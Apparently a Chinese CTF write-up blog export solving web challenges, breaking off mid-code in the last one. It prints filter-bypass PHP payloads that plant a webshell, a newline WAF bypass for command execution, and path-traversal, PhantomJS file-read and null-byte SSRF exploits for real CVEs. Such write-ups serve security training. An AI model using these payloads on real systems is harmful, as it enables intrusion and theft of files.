<h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h3><p>首先题目给出了源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>可以看到可以命令执行，但是过滤了所有的字母和数字，并且限制了字符串发长度不能大于40</p>
<p>于是构造特殊字符来进行命令执行：</p>
<p>payload：</p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">1、  异或方法
$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])&#96;

2、  取反方法
(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9E%DD%A2%D6%D6);</code></pre>

<p>然后用蚁剑连接，注意这里是不能直接命令执行的，因为<code>disable_function</code>限制了很多的命令执行函数</p>
<p>用<code>phpinfo()</code>查看一下</p>
<p>payload：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<pre class="language-none"><code class="language-none">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,
pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,
pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,
pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,
pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,
syslog,imap_open,ld,dl</code></pre>

<p>根目录下有<code>readflag</code> 和  <code>flag</code>文件，<code>flag</code>读取权限不够，<code>readflag</code>不能执行，需要绕过<code>disable_function</code>，利用蚁剑的插件绕过，执行后在蚁剑终端执行<code>/readflag</code>即可读到flag</p>
<h3 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h3><p>题目需要用json格式的数据进行命令执行，如：<code>&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</code></p>
<p>这题应该是比赛时题目给出了源码buu上没放，源码如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PATH=/home/rceservice/jail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span><span class="token punctuation">,</span> <span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Attempting to run command:&lt;br/>'</span><span class="token punctuation">;</span>
    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span> <span class="token operator">!==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Invalid input'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>过滤了很多东西</p>
<p><code>putenv(&#39;PATH=/home/rceservice/jail&#39;)</code>，限制了命令执行的环境，用全路径就可以了，问题是waf的绕过</p>
<p>我们知道php正则匹配在默认模式下认为目标字符串是由单行字符组成的，即不匹配多行，于是即可以用%0A绕过，最终payload如下：</p>
<pre class="language-none"><code class="language-none">&#123;%0a&quot;cmd&quot;:&quot;ls &#x2F;home&#x2F;rceservice&quot;%0a&#125;    &#x2F;&#x2F;flag jail
&#123;%0a&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0a&#125;</code></pre>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-CVE</title>
    <url>/posts/67caa546/</url>
    <content><![CDATA[<h3 id="CVE-2018-12613"><a href="#CVE-2018-12613" class="headerlink" title="CVE-2018-12613"></a>CVE-2018-12613</h3><p><strong>2019GWCTF—我有一个数据库</strong></p>
<p>核心—————–phpmyadmin[CVE-2018-12613]</p>
<p>利用dirb扫到phpmyadmin后台</p>
<p>利用该漏洞可进行任意文件读取</p>
<span id="more"></span>

<pre class="language-powershell" data-language="powershell"><code class="language-powershell">?target=db_sql<span class="token punctuation">.</span>php%253f/<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>etc/passwd

?target=db_sql<span class="token punctuation">.</span>php%253f/<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>flag</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CVE/image-179.png" alt loading="lazy"></p>
<p>漏洞复现介绍与利用：</p>
<ul>
<li>首发：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd">ChaMd5安全团队</a></li>
<li>大专栏：<a href="https://www.dazhuanlan.com/2019/09/28/5d8ebdd8af9b2/">https://www.dazhuanlan.com/2019/09/28/5d8ebdd8af9b2/</a></li>
<li>Freebuf：<a href="https://www.freebuf.com/column/207707.html">https://www.freebuf.com/column/207707.html</a></li>
</ul>
<h3 id="CVE-2019-17221"><a href="#CVE-2019-17221" class="headerlink" title="CVE-2019-17221"></a>CVE-2019-17221</h3><p><strong>WEB_RemoteImageDownloader</strong></p>
<p>核心—————–PhantomJS任意文件读取[CVE-2019-17221]</p>
<p><a href="https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/">Breaching the perimeter – PhantomJs Arbitrary file read</a></p>
<p>界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E6%94%B6%E9%9B%86/image-20200506121650092.png" alt loading="lazy"></p>
<p>POC</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"> 
 x<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">;</span> 
 x<span class="token punctuation">.</span><span class="token function-variable function">onload</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
 document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span> 
 <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> 
 x<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"file:///flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 x<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<p>将html保存到自己的公网ip上，然后题目界面下载即可，最后得到flag的图片</p>
<h3 id="CVE-2020-7066"><a href="#CVE-2020-7066" class="headerlink" title="CVE-2020-7066"></a>CVE-2020-7066</h3><p>CVE介绍：</p>
<pre class="language-none"><code class="language-none">In PHP versions 7.2.x below 7.2.29, 7.3.x below 7.3.16 and 7.4.x below 7.4.4, while using get_headers() with user-supplied URL, if the URL contains zero (\0) character, the URL will be silently truncated at it. This may cause some software to make incorrect assumptions about the target of the get_headers() and possibly send some information to a wrong server.</code></pre>

<p>PHP 7.2.29之前的7.2.x版本、7.3.16之前的7.3.x版本和7.4.4之前的7.4.x版本中的<code>get_headers()</code>函数存在安全漏洞</p>
<p>将<code>get_headers()</code>与用户提供的URL一起使用时，如果URL包含零<code>(\0)</code>字符，则URL将被静默地截断。这可能会导致某些软件对<code>get_headers()</code>的目标做出错误的假设，并可能将某些信息发送到错误的服务器。</p>
<p><strong>[GKCTF2020]cve版签到</strong></p>
<p>点进去题目</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200625130103332.png" alt loading="lazy"></p>
<p>点击View CTFHub后Url请求一个get参数，<code>?url=http://www.ctfhub.com</code>，看着像SSRF，再结合题目提示这个CVE漏洞，还有在请求返回头里有一个<code>Hint：Flag in localhost</code></p>
<p>于是请求：<code>?url=http://localhost%00.ctfhub.com</code>得到如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200625130420379.png" alt loading="lazy"></p>
<p>于是请求<code>?url=http://127.0.0.123%00.ctfhub.com</code>，得到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-其它</title>
    <url>/posts/5d485480/</url>
    <content><![CDATA[<h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><h2 id="百度杯九月场Code"><a href="#百度杯九月场Code" class="headerlink" title="百度杯九月场Code"></a>百度杯九月场Code</h2><p>界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200219214921326.png" alt loading="lazy"></p>
<p>url：<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=hei.jpg</code>，查看源码：</p>
<span id="more"></span>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200219215138731.png" alt loading="lazy"></p>
<p>猜测存在文件包含读取文件操作，于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=index.php</code>查看源码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200219215307566.png" alt loading="lazy"></p>
<p>base64解密后得到index.php的源码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
 */</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Refresh:0;url=./index.php?jpg=hei.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;title>file:'</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/title>'</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"config"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"_"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/gif;base64,"</span><span class="token operator">.</span><span class="token variable">$txt</span><span class="token operator">.</span><span class="token string double-quoted-string">"'>&lt;/img>"</span><span class="token punctuation">;</span>

<span class="token comment">/*
 * Can you find the flag file?
 *
 */</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>注意注释里的这话句<code>Created by PhpStorm</code>，是用<code>PhpStorm</code>编辑器写的，用这个编辑器写的工程文件下会有一个<code>.idea</code>文件夹，<a href="https://segmentfault.com/q/1010000008644646">详</a>，类似于这个项目的根目录文件，里面包含了一些xml文件（配置）。</p>
<p>于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/.idea/workspace.xml</code>得到一个xml页面，提取其中有用信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200219220208401.png" alt loading="lazy"></p>
<p>结合<code>index.php</code>的源码利用<code>config</code>代替<code>_</code>，于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=fl3gconfigichuqiu.php</code>得到<code>fl3g_ichuqiu.php</code>的源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
 */</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span><span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">random</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">,</span> <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$max</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>	<span class="token punctuation">&#123;</span>
        <span class="token variable">$hash</span> <span class="token operator">.=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$max</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$hash</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">encrypt</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$tmp</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>
    <span class="token variable">$rnd</span><span class="token operator">=</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$key</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$s</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token variable">$ttmp</span> <span class="token operator">.=</span> <span class="token variable">$txt</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$key</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$s</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token operator">.</span><span class="token variable">$ttmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$txt</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$rnd</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$key</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$s</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token variable">$tmp</span> <span class="token operator">.=</span> <span class="token variable">$txt</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$s</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$tmp1</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$tmp1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
